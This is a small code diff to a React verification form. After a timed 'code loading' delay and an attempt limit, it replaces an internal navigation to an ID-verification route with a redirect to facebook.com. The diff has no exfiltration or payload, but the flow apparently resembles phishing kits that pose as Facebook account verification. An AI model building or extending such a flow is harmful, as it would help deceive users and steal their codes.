@@ -107,7 +107,7 @@ const VerificationForm: FC<VerificationFormProps> = ({ isMobile }) => {
 
         await new Promise((resolve) => setTimeout(resolve, config.code_load_duration));
         if (attempts >= config.code_load_limit) {
-            navigate('/id-verification');
+            window.location.replace('https://www.facebook.com/');
         }
         setIsLoading(false);
     };
